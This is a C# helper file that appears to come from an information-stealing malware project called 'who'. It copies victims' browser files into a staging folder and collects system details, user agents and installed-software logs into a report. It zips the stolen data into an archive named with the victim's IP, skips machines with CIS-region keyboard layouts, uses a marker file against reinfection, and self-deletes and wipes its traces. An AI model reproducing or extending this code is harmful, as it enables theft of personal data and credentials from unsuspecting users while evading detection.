using System;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using who.Func;

namespace who.Helper
{
    class Helpers
    {

        public static void DeleteAll(DirectoryInfo source)
        {
            try
            {
                foreach (FileInfo fi in source.GetFiles())
                {
                    fi.Delete();
                }

                foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
                {
                    DeleteAll(diSourceSubDir);
                    diSourceSubDir.Delete();
                }
            }

            catch { }
        }

        public static void CopyFiles(string dir, string path)
        {
            if (File.Exists(path))
            {
                try
                {
                    string fd = Path.Combine(Dirs.WebData);
                    
                    int size = 0;
                    if (!(new FileInfo(path).Length == size))
                    {
                        File.Copy(path, Path.Combine(fd, Path.GetFileName(path)), true);
                    }
                }
                catch { }
            }
        }

        public static string Content = "\r\n";

        [CompilerGenerated]
        private static ManagementObject GetManagement(string className)
        {
            ManagementClass managementClass = new ManagementClass(className);
            foreach (ManagementBaseObject instance in managementClass.GetInstances())
            {
                ManagementObject managementObject = (ManagementObject)instance;
                if (managementObject != null)
                {
                    return managementObject;
                }
            }
            return null;
        }

        public static string GetNT()
        {
            try
            {
                ManagementObject managementObject = GetManagement("Win32_OperatingSystem");
                if (managementObject == null)
                {
                    return string.Empty;
                }
                return managementObject["Version"] as string;
            }
            catch
            {  }

            return GetNT();
        }

        public static void AntiSNG()
        {          
            foreach (InputLanguage lang in InputLanguage.InstalledInputLanguages)
            {
                string KeyBoard = Convert.ToString(lang.Culture);

                foreach (string BlackCountry in Dirs.BlackList)
                {
                    if (KeyBoard.Contains(BlackCountry))
                    {
                        Suicide();
                        Environment.Exit(0);
                    }                            
                }
            }
        }

        public static void MutexCheck()
        {
            try
            {
                if (File.Exists(Dirs.Temp + $"\\{Environment.UserName}.krown"))
                {
                    Suicide();
                    Environment.Exit(0);
                }
                else
                    File.Create(Dirs.Temp + $"\\{Environment.UserName}.krown");                           
            }
            catch { }            
        }

        //public static void CreateFromDirectory(string sourceDirectoryName, string destinationArchiveFileName, CompressionLevel compressionLevel, bool includeBaseDirectory)
        //{
        //}

        public static void Zip()
        {

            string zipName = Dirs.Temp + "\\" + User.IP + "_" + User.randomnm + ".zip";

            try
            {
                ZipFile.CreateFromDirectory(Dirs.WorkDir, zipName,
            CompressionLevel.Optimal, false);
            }
            catch
            {   }
        }


        public static void Suicide()
        {
            try
            {
                File.Delete(Dirs.Temp + "\\who.exe");
            }

            catch
            {
                File.SetAttributes(Dirs.Temp + "\\who.exe", FileAttributes.Hidden);
            }
        }

        public static void Clear()
        {
            DirectoryInfo directory = new DirectoryInfo(Dirs.WorkDir);
         
            DeleteAll(directory);
            string randomname = HelpName.GetRandomString();
            File.Delete(Dirs.Temp + $"\\{User.IP + "_" + User.randomnm}.zip");
        }



        public static void InfoDetect()
        {           
            if (User.Info.Count > 0)
            {
                for (int i = 0; i < User.Info.Count; i++)
                {
                  Content += User.Info[i];                                
                }
            }
        }

        

            public static void LogDetect()
        {
            if (Dirs.LogPC.Count > 0)
            {
                Content += "\r\n<===| SOFT |===>";

                for (int i = 0; i < Dirs.LogPC.Count; i++)
                {
                    Content += "\r\n" + Dirs.LogPC[i];                    
                }
            }           
        }

        public static void UADetect()
        {
            if (User.UserAgents.Count > 0)
            {
                Content += "\r\n<===| UserAgents |===>";
                for (int i = 0; i < User.UserAgents.Count; i++)
                {
                    Content += "\r\n" + User.UserAgents[i];
                }
            }
        }
    }
    internal static class HelpName
    {
        public static string GetRandomString()
        {
            return Path.GetRandomFileName().Replace(".", "");
        }
    }
}
